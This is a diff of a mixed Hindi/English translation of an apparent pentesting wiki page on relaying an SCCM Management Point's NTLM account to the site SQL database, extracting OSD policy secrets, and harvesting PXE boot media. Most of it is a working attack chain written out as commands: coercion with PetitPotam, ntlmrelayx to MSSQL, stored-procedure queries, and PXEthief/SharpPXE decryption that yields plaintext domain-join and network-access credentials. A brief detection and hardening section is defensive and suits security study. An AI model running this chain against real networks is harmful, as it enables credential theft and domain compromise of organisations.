@@ -1,41 +1,39 @@
-# SCCM प्रबंधन बिंदु NTLM रिले से SQL – OSD नीति गुप्त निष्कर्षण
+# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-एक **System Center Configuration Manager (SCCM) प्रबंधन बिंदु (MP)** को SMB/RPC के माध्यम से प्रमाणीकरण करने के लिए मजबूर करके और उस NTLM मशीन खाते को **साइट डेटाबेस (MSSQL)** में **रिले** करके आप `smsdbrole_MP` / `smsdbrole_MPUserSvc` अधिकार प्राप्त करते हैं। ये भूमिकाएँ आपको एक सेट स्टोर की गई प्रक्रियाओं को कॉल करने की अनुमति देती हैं जो **ऑपरेटिंग सिस्टम डिप्लॉयमेंट (OSD)** नीति ब्लॉब्स (नेटवर्क एक्सेस खाता क्रेडेंशियल, कार्य-क्रम चर, आदि) को उजागर करती हैं। ब्लॉब्स हेक्स-कोडित/एन्क्रिप्टेड होते हैं लेकिन **PXEthief** के साथ डिकोड और डिक्रिप्ट किए जा सकते हैं, जिससे स्पष्ट गुप्त जानकारी मिलती है।
+SMB/RPC पर प्रमाणीकृत करने के लिए एक **System Center Configuration Manager (SCCM) Management Point (MP)** को विवश करके और उस NTLM मशीन अकाउंट को **site database (MSSQL)** पर relay करके आप `smsdbrole_MP` / `smsdbrole_MPUserSvc` अधिकार प्राप्त कर लेते हैं। ये रोल आपको कुछ stored procedures कॉल करने देते हैं जो **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables, आदि) प्रकट करते हैं। ये blobs hex-encoded/encrypted होते हैं पर इन्हें **PXEthief** से decode और decrypt किया जा सकता है, जिससे plaintext secrets मिलते हैं।
 
-उच्च-स्तरीय श्रृंखला:
-1. MP और साइट DB खोजें ↦ बिना प्रमाणीकरण के HTTP एंडपॉइंट `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`।
-2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` प्रारंभ करें।
-3. **PetitPotam**, PrinterBug, DFSCoerce, आदि का उपयोग करके MP को मजबूर करें।
-4. SOCKS प्रॉक्सी के माध्यम से `mssqlclient.py -windows-auth` के रूप में रिले किए गए **<DOMAIN>\\<MP-host>$** खाते के साथ कनेक्ट करें।
-5. निष्पादित करें:
+High-level chain:
+1. Discover MP & site DB ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
+2. Start `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
+3. MP को प्रमाणीकृत कराने के लिए PetitPotam, PrinterBug, DFSCoerce, आदि का उपयोग करें।
+4. SOCKS proxy के माध्यम से relayed **<DOMAIN>\\<MP-host>$** अकाउंट के रूप में `mssqlclient.py -windows-auth` से कनेक्ट करें।
+5. Execute:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
-* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (या `MP_GetPolicyBodyAfterAuthorization`)
-6. `0xFFFE` BOM को स्ट्रिप करें, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`।
+* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (or `MP_GetPolicyBodyAfterAuthorization`)
+6. Strip `0xFFFE` BOM, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.
 
-गुप्त जानकारी जैसे `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, आदि बिना PXE या क्लाइंट को छुए पुनर्प्राप्त की जाती हैं।
+`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, आदि जैसे secrets बिना PXE या client को छुए recover हो जाते हैं।
 
 ---
 
-## 1. बिना प्रमाणीकरण वाले MP एंडपॉइंट्स की गणना करना
-MP ISAPI एक्सटेंशन **GetAuth.dll** कई पैरामीटर को उजागर करता है जिन्हें प्रमाणीकरण की आवश्यकता नहीं होती (जब तक कि साइट केवल PKI न हो):
+## 1. Enumerating unauthenticated MP endpoints
+MP ISAPI extension **GetAuth.dll** कई ऐसे पैरामीटर उजागर करता है जिन्हें authentication की आवश्यकता नहीं होती (जब तक साइट PKI-only न हो):
 
-| पैरामीटर | उद्देश्य |
+| Parameter | Purpose |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | साइट साइनिंग सर्टिफिकेट का सार्वजनिक कुंजी + *x86* / *x64* **सभी अज्ञात कंप्यूटर** उपकरणों के GUID लौटाता है। |
-| `MPLIST` | साइट में हर प्रबंधन बिंदु की सूची बनाता है। |
-| `SITESIGNCERT` | प्राथमिक-साइट साइनिंग सर्टिफिकेट लौटाता है (LDAP के बिना साइट सर्वर की पहचान करें)। |
+| `MPKEYINFORMATIONMEDIA` | साइट signing cert का public key + *x86* / *x64* **All Unknown Computers** devices के GUIDs लौटाता है। |
+| `MPLIST` | साइट में हर Management-Point की सूची देता है। |
+| `SITESIGNCERT` | Primary-Site signing certificate लौटाता है (LDAP के बिना साइट सर्वर की पहचान करने के लिए)। |
 
-GUIDs प्राप्त करें जो बाद में DB क्वेरी के लिए **clientID** के रूप में कार्य करेंगे:
+उन GUIDs को पकड़ लें जो बाद में DB क्वेरीज़ के लिए **clientID** के रूप में काम करेंगे:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
----
-
-## 2. MP मशीन खाते को MSSQL पर रिले करें
+## 2. MP मशीन अकाउंट को MSSQL पर Relay करें
 ```bash
 # 1. Start the relay listener (SMB→TDS)
 ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
@@ -44,48 +42,48 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-जब मजबूरी सक्रिय होती है, आपको कुछ ऐसा देखना चाहिए:
+जब the coercion फायर होगा तो आपको कुछ इस तरह दिखाई देगा:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
 ```
 ---
 
-## 3. OSD नीतियों की पहचान करें संग्रहीत प्रक्रियाओं के माध्यम से
-SOCKS प्रॉक्सी के माध्यम से कनेक्ट करें (डिफ़ॉल्ट रूप से पोर्ट 1080):
+## 3. Stored procedures के माध्यम से OSD नीतियों की पहचान करें
+SOCKS proxy (port 1080 by default) के माध्यम से कनेक्ट करें:
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-**CM_<SiteCode>** DB पर स्विच करें (3-अंकीय साइट कोड का उपयोग करें, जैसे `CM_001`)।
+**CM_<SiteCode>** DB पर स्विच करें (3-अंकीय site code का उपयोग करें, जैसे `CM_001`)।
 
-### 3.1 अज्ञात-कंप्यूटर GUIDs खोजें (वैकल्पिक)
+### 3.1  Unknown-Computer GUIDs खोजें (वैकल्पिक)
 ```sql
 USE CM_001;
 SELECT SMS_Unique_Identifier0
 FROM dbo.UnknownSystem_DISC
 WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```
-### 3.2 असाइन की गई नीतियों की सूची
+### 3.2  असाइन की गई नीतियों को सूचीबद्ध करें
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-प्रत्येक पंक्ति में `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion` शामिल हैं।
+प्रत्येक पंक्ति में `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion` शामिल हैं।
 
-नीतियों पर ध्यान दें:
-* **NAAConfig**  – नेटवर्क एक्सेस खाता क्रेडेंशियल्स
-* **TS_Sequence** – कार्य अनुक्रम चर (OSDJoinAccount/Password)
-* **CollectionSettings** – इसमें रन-एज़ खाते हो सकते हैं
+निम्न नीतियों पर ध्यान दें:
+* **NAAConfig**  – Network Access Account creds
+* **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
+* **CollectionSettings** – Can contain run-as accounts
 
-### 3.3  पूर्ण बॉडी प्राप्त करें
-यदि आपके पास पहले से `PolicyID` और `PolicyVersion` है, तो आप clientID आवश्यकता को छोड़ सकते हैं:
+### 3.3  पूरा Body प्राप्त करें
+यदि आपके पास पहले से `PolicyID` & `PolicyVersion` हैं तो आप clientID आवश्यकता को छोड़ सकते हैं, इसके लिए उपयोग करें:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> महत्वपूर्ण: SSMS में "अधिकतम वर्ण पुनर्प्राप्त" बढ़ाएँ (>65535) अन्यथा ब्लॉब काट दिया जाएगा।
+> IMPORTANT: SSMS में “Maximum Characters Retrieved” (>65535) बढ़ाएँ, अन्यथा blob कट जाएगा।
 
 ---
 
-## 4. ब्लॉब को डिकोड और डिक्रिप्ट करें
+## 4. blob को डिकोड और डिक्रिप्ट करें
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -93,7 +91,7 @@ echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
 # Decrypt with PXEthief (7 = decrypt attribute value)
 python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
 ```
-पुनर्प्राप्त किए गए रहस्य का उदाहरण:
+रिकवर किए गए secrets का उदाहरण:
 ```
 OSDJoinAccount : CONTOSO\\joiner
 OSDJoinPassword: SuperSecret2025!
@@ -102,20 +100,20 @@ NetworkAccessPassword: P4ssw0rd123
 ```
 ---
 
-## 5. प्रासंगिक SQL भूमिकाएँ और प्रक्रियाएँ
-रिले के दौरान लॉगिन को निम्नलिखित से मैप किया जाता है:
+## 5. प्रासंगिक SQL रोल्स और प्रक्रियाएँ
+Relay होने पर login मैप होता है:
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-इन भूमिकाओं में दर्जनों EXEC अनुमतियाँ होती हैं, इस हमले में उपयोग की जाने वाली प्रमुख अनुमतियाँ हैं:
+ये रोल दर्जनों EXEC permissions उजागर करते हैं; इस attack में उपयोग किए जाने वाले प्रमुख हैं:
 
-| स्टोर की गई प्रक्रिया | उद्देश्य |
+| Stored Procedure | उद्देश्य |
 |------------------|---------|
 | `MP_GetMachinePolicyAssignments` | एक `clientID` पर लागू नीतियों की सूची। |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूरी नीति का शरीर लौटाएँ। |
-| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` पथ द्वारा लौटाया गया। |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूर्ण policy body लौटाता है। |
+| `MP_GetListOfMPsInSiteOSD` | यह `MPKEYINFORMATIONMEDIA` path द्वारा लौटाया जाता है। |
 
-आप पूर्ण सूची की जांच कर सकते हैं:
+You can inspect the full list with:
 ```sql
 SELECT pr.name
 FROM   sys.database_principals AS dp
@@ -126,23 +124,34 @@ AND  pe.permission_name='EXECUTE';
 ```
 ---
 
-## 6. पहचान और हार्डनिंग
-1. **MP लॉगिन की निगरानी करें** – कोई भी MP कंप्यूटर खाता यदि किसी IP से लॉगिन कर रहा है जो इसका होस्ट नहीं है ≈ रिले।
-2. साइट डेटाबेस पर **प्रामाणिकता के लिए विस्तारित सुरक्षा (EPA)** सक्षम करें (`PREVENT-14`)।
-3. अप्रयुक्त NTLM को निष्क्रिय करें, SMB साइनिंग को लागू करें, RPC को प्रतिबंधित करें (
-`PetitPotam`/`PrinterBug` के खिलाफ उपयोग की गई समान रोकथाम)।
-4. MP ↔ DB संचार को IPSec / आपसी-TLS के साथ हार्डन करें।
+## 6. PXE boot media harvesting (SharpPXE)
+* **PXE reply over UDP/4011**: PXE के लिए कॉन्फ़िगर किए गए Distribution Point को एक PXE boot request भेजें। proxyDHCP response से `SMSBoot\\x64\\pxe\\variables.dat` (encrypted config) और `SMSBoot\\x64\\pxe\\boot.bcd` जैसे boot paths और एक वैकल्पिक encrypted key blob का पता चलता है।
+* **Retrieve boot artifacts via TFTP**: लौटाए गए paths का उपयोग करके TFTP पर `variables.dat` डाउनलोड करें (unauthenticated)। यह फ़ाइल छोटी होती है (कुछ KB) और इसमें encrypted media variables होते हैं।
+* **Decrypt or crack**:
+- यदि response में decryption key शामिल है, तो `variables.dat` को सीधे decrypt करने के लिए **SharpPXE** को वह key दें।
+- यदि कोई key प्रदान नहीं किया गया है (PXE media किसी custom password से संरक्षित है), तो SharpPXE offline cracking के लिए एक **Hashcat-compatible** `$sccm$aes128$...` hash उत्सर्जित करता है। पासवर्ड मिलने के बाद फ़ाइल को decrypt करें।
+* **Parse decrypted XML**: plaintext variables में SCCM deployment metadata होता है (**Management Point URL**, **Site Code**, media GUIDs, और अन्य identifiers)। SharpPXE इन्हें parse करता है और follow-on misuse के लिए GUID/PFX/site parameters पहले से भरे हुए एक ready-to-run **SharpSCCM** कमांड को प्रिंट करता है।
+* **Requirements**: केवल PXE listener (UDP/4011) और TFTP तक नेटवर्क पहुंच आवश्यक है; किसी स्थानीय admin privileges की आवश्यकता नहीं है।
 
 ---
 
-## अन्य देखें
-* NTLM रिले के मूलभूत सिद्धांत:
+## 7. डिटेक्शन और हार्डनिंग
+1. **Monitor MP logins** – किसी भी MP computer account के लॉगिन पर नज़र रखें जो उसके होस्ट से नहीं हो रहा है ≈ relay।
+2. साइट database पर **Extended Protection for Authentication (EPA)** सक्षम करें (`PREVENT-14`)।
+3. अनुपयोगी NTLM को अक्षम करें, SMB signing लागू करें, RPC को सीमित करें (उसी निवारक उपायों का प्रयोग जो `PetitPotam`/`PrinterBug` के खिलाफ होते हैं)।
+4. MP ↔ DB संचार को IPSec / mutual-TLS से मजबूत बनाएं।
+5. **Constrain PXE exposure** – UDP/4011 और TFTP के लिए firewall नियम बनाकर केवल trusted VLANs तक सीमित करें, PXE passwords आवश्यक करें, और TFTP पर `SMSBoot\\*\\pxe\\variables.dat` के downloads पर alert करें।
+
+---
+
+## See also
+* NTLM relay fundamentals:
 
 {{#ref}}
 ../ntlm/README.md
 {{#endref}}
 
-* MSSQL दुरुपयोग और पोस्ट-एक्सप्लॉइटेशन:
+* MSSQL abuse & post-exploitation:
 
 {{#ref}}
 abusing-ad-mssql.md
@@ -150,8 +159,9 @@ abusing-ad-mssql.md
 
 
 
-## संदर्भ
-- [मैं आपके प्रबंधक से बात करना चाहूंगा: प्रबंधन बिंदु रिले के साथ रहस्यों की चोरी](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
+## References
+- [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
 - [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
 - [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
+- [SharpPXE](https://github.com/leftp/SharpPXE)
 {{#include ../../banners/hacktricks-training.md}}
